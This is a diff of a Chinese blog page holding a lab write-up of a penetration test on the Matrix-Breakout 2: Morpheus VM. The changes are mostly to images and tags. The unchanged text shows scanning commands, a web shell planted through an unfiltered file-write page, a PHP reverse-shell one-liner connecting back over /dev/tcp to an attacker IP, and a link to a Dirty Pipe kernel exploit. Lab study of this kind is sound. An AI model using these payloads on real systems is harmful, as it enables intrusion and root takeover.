@@ -136,7 +136,7 @@ article: http://ogp.me/ns/article#">
       
       
         <span class="post-updated">
-          最后更新于 <time datetime="2026-02-04T11:35:07.496Z">2026-02-04</time>
+          最后更新于 <time datetime="2026-02-04T11:41:35.530Z">2026-02-04</time>
         </span>
       
       <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
@@ -145,20 +145,18 @@ article: http://ogp.me/ns/article#">
       <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.59.1/24</span><br><span class="line">#发现主机192.168.59.141</span><br><span class="line">nmap -sV -p- 192.168.59.141</span><br><span class="line">#开放端口:22(ssh),80,81(http)</span><br><span class="line">dirsearch -u 192.168.59.141</span><br><span class="line">#robots.txt</span><br></pre></td></tr></table></figure>
 
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/55707847/1767766043499-51382276-f803-40a8-8187-f8b10b028140.png"><!-- 这是一张图片，ocr 内容为： --><br><img src="https://cdn.nlark.com/yuque/0/2026/png/55707847/1767766105804-27bda221-e215-40b9-943b-b0375d05d15e.png"></p>
+<p><img src="/%E5%AF%B9matrix-breakout-2-morpheus%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image.png"><!-- 这是一张图片，ocr 内容为： --><br><img src="/%E5%AF%B9matrix-breakout-2-morpheus%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(1).png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#利用gobuster进行目录扫描(gobuster字典更大)</span><br><span class="line">gobuster dir -u http://192.168.59.141 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php</span><br></pre></td></tr></table></figure>
 
-<!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/55707847/1767766446973-a7403f85-0113-4c64-bdc6-aa25b084baad.png"></p>
+<p><img src="/%E5%AF%B9matrix-breakout-2-morpheus%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(2).png"></p>
 <p>访问192.168.59.141&#x2F;graffiti.php发现这个界面可以写文件</p>
-<!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/55707847/1767766944535-773e96c7-bf23-4549-8b32-9cb853aba4a6.png"></p>
+<p><img src="/%E5%AF%B9matrix-breakout-2-morpheus%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(3).png"></p>
 <p>post请求里有一个是写入文件名，第二个是写入内容，没有任何过滤，直接写入一句话木马，蚁剑连接，第一个FALG文件就在根目录。</p>
 <p>传入反弹shell的执行文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.59.128/443 0&gt;&amp;1&#x27;&quot;);?&gt;</span><br><span class="line">#攻击机监听</span><br><span class="line">nc -lvnp 443</span><br><span class="line">#反弹成功</span><br></pre></td></tr></table></figure>
 
 <!-- 这是一张图片，ocr 内容为： -->
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/55707847/1767767115073-45577111-96c5-4f76-a8fc-3db3ccf3f861.png"></p>
+<p><img src="/%E5%AF%B9matrix-breakout-2-morpheus%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(4).png"></p>
 <p>接下来就是提权了</p>
 <p>查看版本号，看看是否存在内核漏洞</p>
 <p>** CVE-2022-0847** (Dirty Pipe) —— 极其危险[<a target="_blank" rel="noopener" href="https://www.google.com/url?sa=E&q=https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQFjIaE7idy6AjAkQmaAcuRxY_3vGAVhPzLsG1Z_9Y9f2Iqu2tJBFSUbA3N9u46ZVBLaJ95fjt9BzzOEoMKdZ-_I79Vc2o2FC4j8rXdkucUWpqiiiVHfAV4hDYCf1GUcdHAU20ip-J-nBCoHHHeFKwi9e3hVrM_HOO7uKLoaZ6hZK_Tn4Kf6YLXgqtR0K16oTCO1tiLA-n8T-NM=">1</a>][<a target="_blank" rel="noopener" href="https://www.google.com/url?sa=E&q=https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQESJE4tgGKsVlvMBtaxGDMBk2qQLePkVOu60xBxrBiTta6u231bne4TFaBeGABtxEqbVw3c3gN5QupVM03hRFkKpCA2BXeupfJNkuoG1YDUxAy0z1sycd05ExmWyKAKT9tZqy79QVBLMBd12U6ZZw==">2</a>][<a target="_blank" rel="noopener" href="https://www.google.com/url?sa=E&q=https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQFzT4-ipUFtVwzqOUxmc7Pff9DTbo2xPWppa8KZlMXP52iWlxHjgK6DuihhcytiQpfJzKCBIQvs3LIuCLeUV0H3HHjG427JtE_Js_v162bHT3LT70JYnEDdk109dE0_ebc5NCvexu1a5iqu58bRjopFodCsPe1qX2dIdAMG-AA0DFwhNAXk49umqjbyaeAX-3gLxcnDcZEksQYoC3T2FJO78ztnp_KedAmbXzEB8hIwBVak6Pbu4IuV4i5EzbfLlwKgxWfNbX4vmrUM">3</a>]</p>
@@ -170,7 +168,7 @@ article: http://ogp.me/ns/article#">
 <p>在github里寻找Poc利用脚本</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/blob/main/exploit.c">CVE-2022-0847-DirtyPipe-Exploit&#x2F;exploit.c at main · Arinerron&#x2F;CVE-2022-0847-DirtyPipe-Exploit</a></p>
 <p>利用蚁剑上传，编译运行</p>
-<p>拿到权限后在root目录下找到第二个flag<!-- 这是一张图片，ocr 内容为： --><br><img src="https://cdn.nlark.com/yuque/0/2026/png/55707847/1767769739709-8d4f3b05-0ad5-4e70-8c83-aa28365b5da1.png"></p>
+<p>拿到权限后在root目录下找到第二个flag<!-- 这是一张图片，ocr 内容为： --><br><img src="/%E5%AF%B9matrix-breakout-2-morpheus%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(5).png"></p>
 
     </div>
   </article>
@@ -211,7 +209,7 @@ article: http://ogp.me/ns/article#">
     
       <div class="post-prev">
         <span class="nav-label">上一篇</span>
-        <a href="/2026/02/03/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/">SQL注入漏洞基础</a>
+        <a href="/2026/02/03/CSRF%E6%BC%8F%E6%B4%9E/">CSRF漏洞</a>
       </div>
     
     
@@ -300,7 +298,7 @@ article: http://ogp.me/ns/article#">
             
                 <a href="/tags/%E6%A8%A1%E6%8B%9F/" class="tag" aria-label="标签: #模拟">#模拟</a>
             
-                <a href="/tags/Medium/" class="tag" aria-label="标签: #Medium">#Medium</a>
+                <a href="/tags/Easy/" class="tag" aria-label="标签: #Easy">#Easy</a>
             
         </div>
     </div>
